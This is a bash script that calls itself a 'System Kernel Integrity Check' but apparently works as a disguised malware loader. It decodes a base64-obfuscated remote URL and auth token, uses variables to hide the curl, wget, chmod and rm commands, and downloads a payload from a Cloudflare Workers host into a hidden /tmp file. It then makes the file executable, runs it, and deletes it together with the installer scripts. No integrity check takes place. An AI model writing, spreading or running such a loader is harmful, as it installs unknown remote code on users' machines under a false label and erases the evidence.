#!/bin/bash
# ==========================================
# SYSTEM KERNEL INTEGRITY CHECK V10.7 (DEBUG)
# ==========================================

# --- 1. OBFUSCATED SECRETS ---
_h1="aHR0cHM6Ly9jcmFlbC1rZWVwci5wbHVt"
_h2="c29mdHdhcmVkZXYud29ya2Vycy5kZXY="
_k1="Q3JAYWVsLVYxMC1VbHRpbUB0ZS1T"
_k2="M2N1cjF0eS1LM3ktWDkjbTIkTHA="
_hdr_b64="WC1DcmFlbC1BdXRo"
_ua_b64="Q3JhZWxJbnN0YWxsZXIvVjEw"

# --- 2. COMMAND MASKS ---
_c="curl"; _w="wget"; _x="chmod"; _r="rm"

# --- 3. REASSEMBLY ---
_target=$(echo "${_h1}${_h2}" | base64 -d)
_token=$(echo "${_k1}${_k2}" | base64 -d)
_auth_h=$(echo "${_hdr_b64}" | base64 -d)
_agent=$(echo "${_ua_b64}" | base64 -d)

_rnd=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)
_dest="/tmp/.sys_mem_${_rnd}"
_g="\033[38;5;46m"; _rst="\033[0m"

echo -e "${_g}[*] Handshaking with Secure Grid...${_rst}"

# --- 4. EXECUTION LOGIC (VERBOSE MODE) ---
# We removed quiet flags so you can see WHY it fails
if command -v "$_w" >/dev/null 2>&1; then
    $_w --user-agent="$_agent" --header="$_auth_h: $_token" -O "$_dest" "$_target"
else
    $_c -L -v -A "$_agent" -H "$_auth_h: $_token" -o "$_dest" "$_target"
fi

# --- 5. HANDOFF & CLEANUP ---
if [ -s "$_dest" ]; then
    if grep -q "ACCESS DENIED" "$_dest"; then
        echo "Error: Access Denied (Wrong Password/URL)."
        $_r -f "$_dest"; exit 1
    fi
    if grep -q "<!DOCTYPE html>" "$_dest"; then
        echo "Error: Cloudflare Returned HTML (Check Worker URL or GitHub Link)."
        echo "DEBUG: First 5 lines of response:"
        head -n 5 "$_dest"
        $_r -f "$_dest"; exit 1
    fi

    $_x +x "$_dest"
    exec < /dev/tty
    "$_dest"
    
    # Cleanup
    $_r -f "$_dest"
    $_r -f setup.sh install.sh Loader.sh
else
    echo "Error: Connection Refused (Empty Response)."
    echo "DEBUG: The Cloudflare Worker returned 0 bytes."
    echo "CHECK: Is the GitHub Repo 'plumsoftwaredev-bit/Fbm' PUBLIC?"
    $_r -f "$_dest"; exit 1
fi
